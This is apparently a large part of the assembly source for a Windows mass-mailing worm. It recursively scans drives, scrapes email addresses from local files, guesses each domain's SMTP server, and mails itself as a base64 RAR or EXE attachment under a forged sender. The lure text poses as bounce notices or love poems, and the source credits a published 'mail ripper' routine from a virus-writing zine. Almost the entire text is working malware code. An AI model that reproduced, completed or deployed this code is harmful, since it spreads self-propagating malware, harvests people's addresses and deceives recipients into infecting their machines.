	lea	eax,[ebp + boundry]
	push	eax					;boundary
	
	call	GenRandomNumber
	
	and	eax,0d000h
	cmp	eax,1000h
	ja	x_msg1_
	lea	esi,[ebp + xmsg1]
	jmp	Pmsg_
x_msg1_:cmp	eax,2000h
	ja	x_msg2_
	lea	esi,[ebp + xmsg2]
	jmp	Pmsg_
x_msg2_:cmp	eax,3000h
	ja	x_msg3_
	lea	esi,[ebp + xmsg3]
	jmp	Pmsg_
x_msg3_:cmp	eax,4000h
	ja	x_msg4_
	lea	esi,[ebp + xmsg4]
	jmp	Pmsg_
x_msg4_:cmp	eax,5000h
	ja	x_msg5_
	lea	esi,[ebp + xmsg5]
	jmp	Pmsg_
x_msg5_:cmp	eax,6000h
	ja	x_msg6_
	lea	esi,[ebp + xmsg6]
	jmp	Pmsg_
x_msg6_:cmp	eax,7000h
	ja	x_msg7_
	lea	esi,[ebp + xmsg7]
	jmp	Pmsg_
x_msg7_:cmp	eax,8000h
	ja	x_msg8_
	lea	esi,[ebp + xmsg6]
	jmp	Pmsg_
x_msg8_:cmp	eax,9000h
	ja	x_msg9_
	lea	esi,[ebp + xmsg7]
	jmp	Pmsg_
x_msg9_:cmp	eax,0a000h
	ja	x_msg10
	lea	esi,[ebp + xmsg8]
	jmp	Pmsg_
x_msg10:cmp	eax,0b000h
	ja	x_msg11
	lea	esi,[ebp + xmsg9]
	jmp	Pmsg_
x_msg11:cmp	eax,0c000h
	ja	x_msg12
	lea	esi,[ebp + xmsg10]
	jmp	Pmsg_
x_msg12:lea	esi,[ebp + xmsg11]
Pmsg_:	push	esi					;message

	lea	eax,[ebp + boundry]
	push	eax					;boundary
		
	lea	eax,[ebp + boundry]
	push	eax					;boundary
			
	call	GenRandomNumber
	
	and	eax,7000h
	cmp	eax,1000h
	ja	x_sub1_
	lea	esi,[ebp + xsbj1]
	jmp	Psub_
x_sub1_:cmp	eax,2000h
	ja	x_sub2_
	lea	esi,[ebp + xsbj2]
	jmp	Psub_
x_sub2_:cmp	eax,3000h
	ja	x_sub3_
	lea	esi,[ebp + xsbj3]
	jmp	Psub_
x_sub3_:cmp	eax,4000h
	ja	x_sub4_
	lea	esi,[ebp + xsbj4]
	jmp	Psub_
x_sub4_:cmp	eax,5000h
	ja	x_sub5_
	lea	esi,[ebp + xsbj5]
	jmp	Psub_
x_sub5_:cmp	eax,6000h
	ja	x_sub6_
	lea	esi,[ebp + xsbj6]
	jmp	Psub_
x_sub6_:lea	esi,[ebp + xsbj7]
Psub_:	push	esi					;subject
	
	lea	eax,[ebp + MailAddr]
	push	eax					;mail to
	
	lea	eax,[ebp + faked_mfrm]
	push	eax					;mail from
	
	lea	eax,[ebp + MailHeader]
	push	eax					;formated string
	
	push	[ebp + MailBuffer]
	
	call	[ebp + wsprintf]			;create mime message
	
	add	esp,(13*4)				;restore stack
		
	push	0h
	push	eax
	push	[ebp + MailBuffer]
	push	[ebp + vsocket]
	call	[ebp + send]	

SndAtt:	push	0h
	push	[ebp + sizeofbase64out]
	push	[ebp + base64outputmem]
	push	[ebp + vsocket]
	call	[ebp + send]				;send attachment

	lea	eax,[ebp + boundry]
	push	eax	
	call	PushBN
	db	0dh,0ah,"--%s--",0dh,0ah,0dh,0ah,'.',0dh,0ah,0h	
PushBN:	push	dword ptr [ebp + MailBuffer]
	call	[ebp + wsprintf]			;send end of DATA
	add	esp,(3*4)

	push	0h
	push	eax
	push	[ebp + MailBuffer]
	push	[ebp + vsocket]
	call	[ebp + send]
	
	call	__recv	
		
ExitFm:	push	[ebp + MailBuffer]
	call	[ebp + GlobalFree]
QuitM:	push	0h
	push	SizeOfQuit
	call	O_QT
	SizeOfQuit	equ	(O_QT-$)
	db	db	"QUIT",0dh,0ah
O_QT:	push	dword ptr [ebp + vsocket]
	call	[ebp + send]
Disconnect:	
	push	dword ptr [ebp + vsocket]
	call	[ebp + closesocket]
	ret


__recv:	push	0h
	push	SizeOfGB
	call	PushGB
	SizeOfGB	equ	(PushGB-$)
	GetBuffer	db	512d	dup(0)
PushGB:	push	dword ptr [ebp + vsocket]
	call	[ebp + recv]
	ret
	
	
MailType	db	0		;1=failed sending/0=love letter	
	
MailBuffer	dd	0

boundry		db	20h	dup(0)
		SizeOfBoundary	equ	($-boundry-1)	;keep null at the end

faked_mfrm	db	128d	dup(0)

rar_suffix	db	".rar",0h
exe_suffix	db	".exe",0h

;****************************[Mail Format]******************************************


MailHeader:

	db	"From:<%s>",0dh,0ah
	db	"To: %s",0dh,0ah
	db	"Subject:%s",0dh,0ah
	db	"MIME-Version: 1.0",0dh,0ah
	db	"Content-Type: multipart/mixed;",0dh,0ah
	db	' boundary="%s"',0dh,0ah
	db	"X-Priority: 3",0dh,0ah
	db	"X-MSMail-Priority: Normal",0dh,0ah
	db	"X-Mailer: Microsoft Outlook Express 6.00.2800.1106",0dh,0ah
	db	"X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1106",0dh,0ah
	db	0dh,0ah,"This is a multi-part message in MIME format.",0dh,0ah
	db	"--%s",0dh,0ah
	db	"Content-Type: text/plain;",0dh,0ah
	db	' charset="windows-1255"',0dh,0ah
	db	"Content-Transfer-Encoding: 7bit",0dh,0ah,0dh,0ah
	db	"%s",0dh,0ah
	db	"--%s",0dh,0ah
	db	"Content-Type: application/octet-stream;",0dh,0ah
	db	' name= "%s%s"',0dh,0ah
	db	"Content-Transfer-Encoding: base64",0dh,0ah
	db      'Content-Disposition: attachment; filename="%s%s"',0dh,0ah,0dh,0ah,0h


;****************************[Mail type 1]******************************************

	
msg1	db	"The server could not fully receive an email message which someone",0ah,0dh
	db	"trying to send you. The incomplete message has been added as attachment.",0
		
msg2	db	"Error 569: Mail delivery failure. The email message has been added to the attachments.",0h

msg3	db	"Your message could not be delivered to its target. Please check the attachment for further info.",0h

msg4	db	"The message cannot be represented in 7-bit ASCII encoding and has been sent as a binary attachment.",0h

msg5	db	"The message contains Unicode characters and has been sent as a binary attachment.",0h

msg6	db	"Mail transaction failed. Partial message is available.",0h
	
	
frm1	db	"Staff",0h
frm2	db	"Admin",0h
frm3	db	"Management",0h
frm4	db	"Support",0h
frm5	db	"Administration",0h
frm6	db	"PostMaster",0h
frm7	db	"No.reply",0h

sub1	db	"Mail delivery failure",0
sub2	db	"Impartial mail message",0
sub3	db	"Error receiving mail",0

atch1	db	"partialmessage",0
atch2	db	"undelivered",0
atch3	db	"original",0
atch4	db	"restored_mail",0
atch5	db	"letter",0
atch6	db	"unrecived",0
atch7	db	"textfile1",0
		
;****************************[Mail type 2]******************************************

xsbj1	db	"Thee and me",0
xsbj2	db	"Yours forever",0
xsbj3	db	"My heart",0
xsbj4	db	"True feelings",0
xsbj5	db	"Me and you",0
xsbj6	db	"A kiss for a smile",0
xsbj7	db	"Valentine (a little late)",0
	
	
xmsg1	db	"A special world for you and me",0dh,0ah
	db	"A special bond one cannot see",0dh,0ah
	db	"It wraps us up in its cocoon",0dh,0ah
	db	"And holds us fiercely in its womb.",0h
	
xmsg2	db	"Its fingers spread like fine spun gold",0dh,0ah
	db	"Gently nestling us to the fold",0dh,0ah
	db	"Like silken thread it holds us fast",0dh,0ah
	db	"Bonds like this are meant to last.",0h
	
xmsg3	db	"And though at times a thread may break",0dh,0ah
	db	"A new one forms in its wake",0dh,0ah
	db	"To bind us closer and keep us strong",0dh,0ah
	db	"In a special world, where we belong.",0h
	
xmsg4	db	"My love, I have tried with all my being",0dh,0ah
	db	"to grasp a form comparable to thine own,",0dh,0ah
	db	"but nothing seems worthy;",0h
	
xmsg5	db	"I know now why Shakespeare could not",0dh,0ah
	db	"compare his love to a summer’s day.",0dh,0ah
	db	"It would be a crime to denounce the beauty",0dh,0ah
	db	"of such a creature as thee,",0dh,0ah
	db	"to simply cast away the precision",0dh,0ah
	db	"God had placed in forging you.",0h
	
xmsg6	db	"Each facet of your being",0dh,0ah
	db	"whether it physical or spiritual",0dh,0ah
	db	"is an ensnarement",0dh,0ah
	db	"from which there is no release.",0dh,0ah
	db	"But I do not wish release.",0dh,0ah
	db	"I wish to stay entrapped forever.",0dh,0ah
	db	"With you for all eternity.",0dh,0ah
	db	"Our hearts, always as one.",0h
	
xmsg7	db	"If I could have just one wish,",0dh,0ah
	db	"I would wish to wake up everyday",0dh,0ah
	db	"to the sound of your breath on my neck,",0dh,0ah
	db	"the warmth of your lips on my cheek,",0dh,0ah
	db	"the touch of your fingers on my skin,",0dh,0ah
	db	"and the feel of your heart beating with mine...",0dh,0ah
	db	"Knowing that I could never find that feeling",0dh,0ah
	db	"with anyone other than you.",0h
	
xmsg8	db	"I love the way you look at me,",0dh,0ah
	db	"Your eyes so bright and blue.",0dh,0ah
	db	"I love the way you kiss me,",0dh,0ah
	db	"Your lips so soft and smooth.",0h
	
xmsg9	db	"I love the way you make me so happy,",0dh,0ah
	db	"And the ways you show you care.",0dh,0ah
	db	"I love the way you say, I Love You,",0dh,0ah
	db	"And the way you're always there.",0h
	
xmsg10	db	"I love the way you touch me,",0dh,0ah
	db	"Always sending chills down my spine.",0dh,0ah
	db	"I love that you are with me,",0dh,0ah
	db	"And glad that you are mine.",0h
	
xmsg11	db	"I wrote your name in the sky,",0dh,0ah
	db	"but the wind blew it away.",0dh,0ah
	db	"I wrote your name in the sand,",0dh,0ah
	db	"but the waves washed it away.",0dh,0ah
	db	"I wrote your name in my heart,",0dh,0ah
	db	"and forever it will stay.",0h
	
	
xattch1	db	"The sky",0h
xattch2	db	"My wish",0h
xattch3	db	"My hope",0h
xattch4	db	"My desire",0h
xattch5	db	"My love",0h
xattch6	db	"Forever",0h
xattch7	db	"A smile",0h
xattch8	db	"My heart",0h
	
;*************************************************************************************

;word creation engine by BlueOwl
;-------------------------------
;		push nicklen
;		push ptr to output

makeword:	call	GenRandomNumber
makeword_in:	push	ecx edi ebx edx
		mov	edi, [esp+20]
		mov	ecx, [esp+24]
		xchg	eax, ebx
		push	3
		call	_nexthash3
		dec	edi
_loop:		inc	edi
		dec	eax
		jz	_gen1
		dec	eax
		jz	_gen2
_gen0:		push	5
		call	_nexthash7
		mov	al, byte  ptr[ebp + worddata + eax]
		mov	byte [edi], al
		push	2
		call	_nexthash3
		inc	eax
		cmp	ecx, 2
		jnz	_next
		mov	eax, 2
		jmp	_next
_gen1:		push	3
		call	_nexthash3
		mov	al, byte  ptr[ebp +worddata+5+eax]
		mov	byte [edi], al
		xor	eax, eax
		jmp	_next
_gen2:		push	4
		call	_nexthash7 
		mov	al, byte ptr  [ebp +worddata+8+eax]
		mov	byte [edi], al
		push	2
		call	_nexthash3
		cmp	ecx, 2
		jz	_next
		xor	eax, eax
_next:		dec	ecx
		jnz	_loop
		sub	edi, [esp+20]
		xchg	eax, edi
		pop	edx ebx edi ecx
		ret	8

_nexthash3:	mov	eax, ebx
		rol	ebx, 2
		and	eax, 3
		jmp	_mainnexthash
_nexthash7:	mov	eax, ebx
		rol	ebx, 3
		and	eax, 7
_mainnexthash:	xor	edx, edx
		div	dword ptr [esp+4]
		xchg	eax, edx
		ret	4
		
		worddata db "aeioulnrkdpc",0,0

	
CreateVirusRarFile:
	
	lea	edx,[ebp + FileToInfect]
	push	edx
	push	0ffh
	call	[ebp + GetTempPath]			;get the temp directory path
	or	eax,eax
	je	CRF_Fail
		
	lea	edi,[ebp + FileToInfect]
_SNB:	cmp	byte ptr [edi],0h
	je	_GTFN
	inc	edi
	jmp	_SNB					;seek till 0 byte found
	
_GTFN:	call	InitRandomNumber
	mov	ecx,6h
@__RandLetter:	
	call	GenRandomNumber
	and	al,19h
	add	al,61h
	stosb
	loop	@__RandLetter				;gen random file name
	mov	byte ptr [edi],'.'
	inc	edi
	mov	ecx,3h
@x_RandLetter:	
	call	GenRandomNumber
	and	al,19h
	add	al,61h
	stosb
	loop	@x_RandLetter				;gen random file suffix
		
	xor	eax,eax
	
	push	eax
	push	FILE_ATTRIBUTE_NORMAL
	push	CREATE_ALWAYS
	push	eax
	push	eax
	push	GENERIC_WRITE
	lea	edx,[ebp + FileToInfect]
	push	edx
	call	[ebp + CreateFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	CRF_Fail
		
	push	eax					;push fh for CloseHandle...
	
	push	0h
	call	NWBx
	dd	0	
NWBx:	push	SizeOfRawFile
	lea	ebx,[ebp + RarFile]
	push	ebx
	push	eax
	call	[ebp + WriteFile]
	
	call	[ebp + CloseHandle]			;close file
	
	mov	[ebp + nFileSizeLow_],SizeOfRawFile
	
	call	InfectRar
	jnc	CRF_Fail
	
	stc
	ret
CRF_Fail:
	clc
	ret

	use_rar_file		db	0

RarFile:
	db 052h,061h,072h,021h,01ah,007h,000h,0cfh,090h,073h
	db 000h,000h,00dh,000h,000h,000h,000h,000h,000h,000h
	
	db 0,0,0,0,0,0,0				;dummy end of rar
	
	SizeOfRawFile	equ	($-RarFile)
	
	CREATE_ALWAYS	equ     2

ScanDrive:
	lea	eax,[ebp + WIN32_FIND_DATA2]
	push	eax
	lea	eax,[ebp + SearchMask]
	push	eax
	call	[ebp + FindFirstFile]
	cmp	eax,INVALID_HANDLE_VALUE		;error ?
	je	@Stops_					;stop search
	
	mov	[ebp + hsearch],eax			;save search handle
	
@NxtF_:	mov	eax,[ebp + dwFileAttributes_]		;get file attributes
	and	eax,FILE_ATTRIBUTE_DIRECTORY		;remove bit masks
	cmp	eax,FILE_ATTRIBUTE_DIRECTORY		;it is directory ?
	jne	_isFile
	cmp	byte ptr [ebp + cFileName_],'.'		;its start with . ?
	je	_FndNxt

	push	[ebp + hsearch]				;save search handle
	
	lea	eax,[ebp + cFileName_]
	push	eax
	call	[ebp + SetCurrentDirectory]		;enter directory
	or	eax,eax
	je	_skpdir

	call	ScanDrive				;infect all sub directorys


	lea	eax,[ebp + dotdot]
	push	eax
	call	[ebp + SetCurrentDirectory]		;return to current directory
	

_skpdir:pop	[ebp + hsearch]				;restore search handle
	jmp	_FndNxt
	
	
	
_isFile:call	CheckFileSuffix
	jnc	_FndNxt
		
	push	1500d
	call	[ebp + Sleep]
	
	call	SearchMails
	

_FndNxt:lea	eax,[ebp + WIN32_FIND_DATA2]
	push	eax
	push	[ebp + hsearch]
	call	[ebp + FindNextFile]				;find next file
	or	eax,eax
	jne	@NxtF_

	push	[ebp + hsearch]
	call	[ebp +FindClose]			;end the search
	
@Stops_:ret



CheckFileSuffix:
	lea	eax,[ebp + cFileName_]
_Find0:	cmp	byte ptr [eax],0h
	je	_GetExt
	inc	eax
	jmp	_Find0
_GetExt:sub	eax,4h					;go before the .xxx	
	or	dword ptr [eax],20202020h		;convert to lower case
	cmp	dword ptr [eax],"txt."			;txt file ?
	je	GoodSuf
	cmp	dword ptr [eax],"mth."			;html file ?
	je	GoodSuf
	cmp	dword ptr [eax],"ftr."			;rtf file ?
	je	GoodSuf
	cmp	dword ptr [eax],"cod."			;doc file ?
	je	GoodSuf
	cmp	dword ptr [eax],"xdb."			;dbx file ?
	je	GoodSuf
	cmp	dword ptr [eax],"php."			;php file ?
	je	GoodSuf
	cmp	dword ptr [eax],"psj."			;jsp file ?
	je	GoodSuf	
	cmp	dword ptr [eax],"igc."			;cgi file ?
	je	GoodSuf		
	jmp	BadSuff
GoodSuf:stc
	ret
BadSuff:clc
	ret




SearchMails:
	xor	eax,eax
	push	eax
	push 	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	eax
	push	eax
	push	GENERIC_READ
	lea	eax,[ebp + cFileName_]
	push	eax
	call	[ebp + CreateFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	OutSM
	mov	[ebp + hfile],eax
	
	mov	[ebp + hmail],0h
	
@next_read:
	push	0
	lea	eax,[ebp + readed_bytes]
	push	eax
	push	200h
	lea	eax,[ebp + data_buffer]
	push	eax
	push	[ebp + hfile]
	call	[ebp + ReadFile]
	or	eax,eax				;success ?
	je	CloseF
@NextM:	
	cmp	[ebp + readed_bytes],0h
	je	CloseF
	
	mov	[ebp + _esp],esp
	lea	eax,[ebp + hmail]
	push	eax
	push	[ebp + readed_bytes]
	lea	eax,[ebp + data_buffer]
	push	eax
	call	find_next_email

	mov	esp,[ebp + _esp]
	
	or	eax,eax				;success ?
	je	@next_read
		
	push	eax
	lea	edi,[ebp + MailAddr]
	mov	al,0h
	mov	ecx,80h
	rep	stosb
	pop	eax
	

	mov	esi,eax				;eax = mail address in stack memory !!
	lea	edi,[ebp + MailAddr]		;so we have to copy the mail address 
NMCpy:	lodsb					;from stack from  stack memory into 
	or	al,al				;normal memory to  avoid fucking it 
	je	EndMCpy				;while using the stack.
	stosb
	jmp	NMCpy
EndMCpy:
	call	ConnectSMTP			;build smtp server from mail address & connect
	jnc	@NextM

	call	TransferWorm			;transfer the worm over mails

	jmp	@NextM
	
CloseF:	push	[ebp + hfile]
	call	[ebp + CloseHandle]
OutSM:	ret





ConnectSMTP:
	;build smtp server address and try to connect...
	lea	edi,[ebp + MailAddr]
NextMB:	cmp	byte ptr [edi],'@'
	je	BuildMS
	inc	edi
	jmp	NextMB
BuildMS:inc	edi					;edi=domain
	mov	[ebp + MD_Addr],edi
	mov	ecx,NumberOfMD
	lea	edi,[ebp + SmtpServerAdd]
	lea	esi,[ebp + mail_domains]
@NextMD:push	esi
	push	ecx
_NextMD:cmp	byte ptr [esi],0h
	je	CpyD
	lodsb
	stosb
	jmp	_NextMD
CpyD:	mov	byte ptr [edi],'.'
	inc	edi
	mov	esi,[ebp + MD_Addr]
NextMDb:cmp	byte ptr [esi],0h
	je	TryToC
	lodsb
	stosb
	jmp	NextMDb
	

TryToC:	
	mov	[ebp + ConnectionSuccess],0h
	

	call	overTI
	dd	0
overTI: xor	eax,eax	
	push	eax
	push	eax
	lea	ebx,[ebp + ConnectToServer]
	push	ebx
	push	eax
	push	eax
	
	call	[ebp + CreateThread]
	or	eax,eax
	je	SkipMD
	
	mov	[ebp + CTS_h],eax
	
	push	(15*1000)
	push	eax
	call	[ebp + WaitForSingleObject]
	
	push	[ebp + CTS_h]
	call	[ebp + CloseHandle]
	
	cmp	byte ptr [ebp + ConnectionSuccess],0h
	je	SkipMD
	
	pop	ecx
	jmp	SmtpOk
	
SkipMD:	mov	al,0h
	mov	ecx,0ffh
	lea	edi,[ebp + SmtpServerAdd]
	rep	stosb
	pop	ecx
	pop	esi
	cmp	ecx,0h
	je	CSMTP_Fail
	inc	esi
@__NMDb:cmp	byte ptr [esi],0h
	je	xNextMd
	inc	esi
	jmp	@__NMDb
xNextMd:inc	esi
	lea	edi,[ebp + SmtpServerAdd]
	
	dec	ecx
	cmp	ecx,0h
	je	CSMTP_Fail
	jmp	@NextMD
	
SmtpOk:	pop	esi
	stc
	ret
CSMTP_Fail:
	clc
	ret
	
	CTS_h		dd	0
	
	mail_domains 	db "smtp",0,"mail",0
			
	NumberOfMD	equ	2
			
	SmtpServerAdd	db	0ffh	dup(0)
	
	MailAddr	db	80h	dup(0)	
	
	MD_Addr		dd	0
	
	xCON_ID		dd	0
	
	ConnectionSuccess	db	0
	
ConnectToServer:
	call 	CTS_delta
CTS_delta:pop	ebp
	sub	ebp,offset CTS_delta
	push	IPPROTO_TCP
	push	SOCK_STREAM
	push	AF_INET
	call	[ebp + socket]		;create socket
	cmp	eax,SOCKET_ERR
	je	ConnectionErr
	mov	dword ptr [ebp + vsocket],eax
	push	25			;smtp
	call	[ebp + htons]
	mov	word ptr [ebp + sin_port],ax
	mov	word ptr [ebp + sin_family],AF_INET
	lea	eax,[ebp + SmtpServerAdd]
	push	eax
	call	[ebp + gethostbyname]
	cmp	eax,0h
	je	CloseSockErr
	mov	eax,dword ptr [eax + HOSTENT_IP]
	mov	eax,dword ptr [eax]
	mov	eax,dword ptr [eax]
	mov	dword ptr [ebp + sin_addr],eax
	push	SizeOfSOCKADDR
	lea	eax,[ebp + SOCKADDR]
	push	eax
	push	dword ptr [ebp + vsocket]
	call	[ebp + connect]
	cmp	eax,0h
	jne	EN_Cs
	mov	byte ptr [ebp + ConnectionSuccess],1h
	push	0AAAAAAAAh
	call	[ebp + ExitThread]
CloseSockErr:
	push	dword ptr [ebp + vsocket]
	call	[ebp + closesocket]
ConnectionErr:
	mov	byte ptr [ebp + ConnectionSuccess],0h
	push	0DEADB33Fh
	call	[ebp + ExitThread]
	

GetWinsockApis:
	lea	eax,[ebp + WinsockDll]
	push	eax
	call	[ebp + LoadLibrary]
	cmp	eax,0h
	je	GetWinsockApisErr
	mov	dword ptr [ebp + hWinsock],eax
	xchg	eax,edx
	mov	ecx,NumberOfWinsockFunctions
	lea	eax,[ebp + winsock_functions_sz]
	lea	ebx,[ebp + winsock_functions_addresses]
	call	GetNextAPI
	ret
GetWinsockApisErr:
	clc
	ret
	
	WinsockDll	db	"ws2_32.dll",0
	hWinsock	dd	0
	
	
	winsock_functions_sz:
	
	_WSAStartup	db	"WSAStartup",0
	_WSACleanup	db	"WSACleanup",0
	_socket		db	"socket",0
	_gethostbyname	db	"gethostbyname",0
	_connect	db	"connect",0
	_recv		db	"recv",0
	_send		db	"send",0
	_htons		db	"htons",0
	_closesocket	db	"closesocket",0
	
	winsock_functions_addresses:
	
	WSAStartup	dd	0
	WSACleanup	dd	0
	socket		dd	0
	gethostbyname	dd	0
	connect		dd	0
	recv		dd	0
	send		dd	0
	htons		dd	0
	closesocket	dd	0
	
	NumberOfWinsockFunctions	equ	9	
	
	VERSION1_1	equ	0101h
	AF_INET		equ	2      
	SOCK_STREAM	equ     1     
	SOCKET_ERR	equ	-1   
	HOSTENT_IP      equ	0ch
	IPPROTO_TCP	equ	6h	
	
	
	vsocket		dd	0
	
	
WSADATA:	
	mVersion	dw	0
	mHighVersion	dw	0
	szDescription	db	257 dup(0)
	szSystemStatus	db	129 dup(0)
	iMaxSockets	dw	0
	iMaxUpdDg	dw	0
	lpVendorInfo	dd	0	
	
	
SOCKADDR:
	sin_family	dw	0	
	sin_port	dw	0
	sin_addr        dd      0       
	sin_zero	db	8 dup(0)
	SizeOfSOCKADDR	equ	($-SOCKADDR)	




	_esp		dd	0
	hmail		dd	0
	readed_bytes	dd	0

	data_buffer	db	200h	dup(0)


;*************************************************
;MAIL RIPPER - Published in 29a#6 by annonymouse
;*************************************************

find_next_email:
; ----------------------------------------------
; CONFIG BLOCK
; ----------------------------------------------
__MAX_VALID_LEN equ     260
__MAX_EMAIL_EXT	equ	3
__MIN_EMAIL_EXT	equ	2  
; ----------------------------------------------
        pushad        
        
        call    __xx
__xx:   pop     ebp
        sub     ebp, offset __xx                
        xor     eax, eax
	sub	esp, __MAX_VALID_LEN
        sub     esp, 4*4
        
__last_pos      equ     dword ptr [esp+11*4+4*4+__MAX_VALID_LEN]
__len           equ     dword ptr [esp+10*4+4*4+__MAX_VALID_LEN]
__buf           equ     dword ptr [esp+09*4+4*4+__MAX_VALID_LEN]
__p2            equ     dword ptr [esp+04]
__p3            equ     dword ptr [esp+08]
__full_len      equ     dword ptr [esp+12]
__p1            equ     dword ptr [esp]
__ret_buf	equ	[esp+4*4]

__0:    mov     edx, __buf
        mov     esi, edx
        add     edx, __len
        mov     eax, __last_pos
        mov     eax, [eax]
        add     esi, eax
        cmp     esi, edx
        jae     __exit_none
                
        cld

__1:    lodsb
        cmp     esi, edx
        jae     __exit_none
        cmp     al, '@'         ; get to the middle
        jnz     __1  
                        
        dec     esi     
        mov     __p1, esi       ; middle address
                
        xor     ecx, ecx
        inc     esi

__2:    lodsb
        or      al, al          
        jz      __3     
        cmp     esi, edx
        jae     __3
        
        inc     ecx
                        
; check out for separators
        cmp     al, 2Dh		; '-'
        je      __2
        cmp     al, 2Eh		; '.'
        je      __2
        cmp     al, 30h
        jb      __x8
        cmp     al, 39h
        jbe     __2                             
        cmp     al, 41h
        jb      __x3
	cmp	al, 60h
	jbe	__a
	jmp	__x03
__a:    cmp     al, 5Bh
        jb      __2
        cmp	al, 5Ch
        jz	__xx3
        cmp     al, 5Eh
        jb      __3                     
        cmp     al, 60h                 
        je      __3

__x03:  cmp     al, 7Ah
        jbe     __2                     
        
__3:    cmp     ecx, 4                  ; min len
        jb      __x3            
        cmp     ecx, __MAX_VALID_LEN
        jb      __4

__x3:   mov     eax, __last_pos
        sub     esi, __buf
        mov     [eax], esi              ; save new srch position        
        jmp     __0

__xx3:	dec	esi

__4:	mov     __p2, esi               ; end pos
        xor     ecx, ecx
        
        std                                     
        mov     esi, __p1               ; scan backward from the middle 
        xor     ecx, ecx
        dec     esi
                
__5:    inc     ecx
        lodsb
        or      al, al
        jz      __8
        
        cmp     esi, __buf
        jbe     __6
                
; check out for separators
        cmp     al, 2Dh         ; -     
        je      __5
        cmp     al, 2Eh         ; .
        je      __5
        cmp     al, 30h
        jb      __8
        cmp     al, 39h
        jbe     __5                     
        cmp     al, 41h
        jb      __8             
        cmp     al, 5Bh
        jb      __5                     
        cmp     al, 5Eh
        jb      __8             
        cmp     al, 60h                 
        je      __8             
        cmp     al, 7Ah
        jbe     __5                                             
        
__6:    or      ecx, ecx
        jnz     __7     
        cmp     ecx, __MAX_VALID_LEN
        jb      __7
        
__ret:  mov     eax, __p2
        inc     eax
        sub     eax, __buf              ; calc offset
        mov     ebx, __last_pos
        mov     [ebx], eax      
        jmp     __0

__8:    inc     esi
        inc     esi
        dec     ecx
        jmp     __6
        
__x8:   dec     esi     
        jmp     __4
                
; p3 = start of the string      
__7:    mov     eax, esi
        mov     __p3, eax
        
; multidot check for 1st part
        mov     esi, __p1
        std
        dec     esi

__x5:   lodsb
        cmp     esi, __p3               ; start of buffer ?
        jbe     __x05
        cmp     al, '.'                 ; dot ?
        jnz     __x5                    
        cmp     byte ptr [esi], '.'     ; another dot near ?
        jz      __ret			; get da fuck out!

        cmp	word ptr [esi], '@.'
     	jz	__ret
        cmp	word ptr [esi], '.@'
        jz	__ret
	jmp     __x5
        
__x05:  mov     eax, __p2
        sub     eax, __p3
        mov     __full_len, eax
        
; syntax check. (alpha-begining,dot-start,dot-end fixup,short extension)
__d9:
        mov     esi, __p3
        cld

__9:    lodsb
        cmp	al, '.'
        jnz	__d10

	inc	__p3
        dec	__full_len
        jmp	__d9

__d10:  cmp     al, 41h                 ; 1a@e.com, .a@e.com are not valid addrs
        jb      __ret           
                                        
        mov     esi, __p2
        std
        dec     esi
        xor     ecx, ecx

; multidot check for 2nd part
__x9:   lodsb
        cmp     al, '@'                 ; already @ ?
        jz      __x09                   ; done testing
        cmp     al, '.'                 ; dot ?
        jnz     __x9                    
        cmp     byte ptr [esi], '.'     ; another dot near ?
        jz      __ret                   ; get da fuck out!
        cmp	word ptr [esi], '@.'
	jz	__ret
        cmp	word ptr [esi], '.@'
	jz	__ret
        jmp     __x9

__x09:  mov     esi, __p2
        dec     esi     

__x10:  lodsb                           ; pass all non-alpha chars
        cmp     al, 'A'
        jae     __10
        dec     __full_len
        jmp     __x10
                        
__10:   inc     ecx
        lodsb        
        cmp     esi, __buf              ; check overflow
        jz      __exit_none
        cmp     esi, __p3               ; prevent email-without-a-dot processing
        jbe     __ret
        
        cmp     al, '.'
        jz      __11
        cmp     al, '@'                 ; email with more than one '@' ?
        jz      __ret                   ; dont process
        jmp     __10
        
__11:   cmp     ecx, __MIN_EMAIL_EXT
        jb      __ret
        cmp     ecx, __MAX_EMAIL_EXT    ; dont let extension be more that 3 bytes
        ja      __ret
		
        mov     esi, __p3
        mov     ecx, __full_len
        call	__is_ascii		; final check
        or	eax, eax
        jz	__ret

        lea     edi, __ret_buf
        cld        
        rep     movsb                   ; copy entire email        
        xor     eax, eax
        stosd                           ; zero-terminated
        
__exit: mov     eax, __p2
        inc     eax
        mov     ebx, __last_pos
        sub     eax, __buf
        mov     [ebx], eax              ; for later use
        lea	eax, __ret_buf
        
__x12:  add     esp, 4*4+__MAX_VALID_LEN
        mov     [esp+7*4], eax
        
__12:   popad
        ret
        
__exit_none:
        xor     eax, eax
        jmp     __x12    

__is_ascii:
        pushfd
        push	esi
        push	ecx        
	cld
__isascii1:
        lodsb
        cmp	al, 2Dh
        jb	__is_ascii_f
        cmp	al, 7Ah
        ja	__is_ascii_f
        loop	__isascii1

        push	1
        pop	eax
        pop	ecx
        pop	esi
        popfd
        ret
__is_ascii_f:
	pop	ecx
        pop	esi
        popfd
	xor	eax, eax
        ret

;find_next_email endp

findemail_proc_size     = $-find_next_email

;**********************************************



	kernel32base	dd	0
	
IF	DEBUG
	
	DriveInfectionWarning	db	"Do You Wise To Infect This Drive?",0

ENDIF



		
GetADVAPI32Apis:
	lea	eax,[ebp + ADVAPI32dll]
	push	eax
	call	[ebp + LoadLibrary]
	xchg	eax,edx
	mov	ecx,NumberOfRegFunctions
	lea	eax,[ebp + reg_functions_sz]
	lea	ebx,[ebp + reg_function_addresses]
	call	GetNextAPI
	ret

	ADVAPI32dll		db	"ADVAPI32.DLL",0
	
	reg_functions_sz:

	_RegOpenKeyExA		db	"RegOpenKeyExA",0
	_RegCloseKey		db	"RegCloseKey",0
	_RegSetValueEx		db	"RegSetValueExA",0

	reg_function_addresses:
	
	RegOpenKeyEx		dd	0
	RegCloseKey		dd	0
	RegSetValueEx		dd	0
	
	NumberOfRegFunctions	equ	3	
	
	

	KEY_READ		equ	00020019h
	ERROR_SUCCESS		equ	0h

GetUser32Apis:
	lea	eax,[ebp + User32dll]
	push	eax
	call	[ebp + LoadLibrary]
	xchg	eax,edx
	mov	ecx,NumberOfUser32Functions
	lea	eax,[ebp + user32_functions_sz]
	lea	ebx,[ebp + user32_functions_addresses]
	call	GetNextAPI
	ret
	
	User32dll	db	"User32.dll",0
	
	user32_functions_sz:
	
	_MessageBox	db	"MessageBoxA",0
	_wsprintfA	db	"wsprintfA",0h
	
	user32_functions_addresses:
	
	MessageBox	dd	0
	wsprintf	dd	0
	
	NumberOfUser32Functions	equ	2
	
			
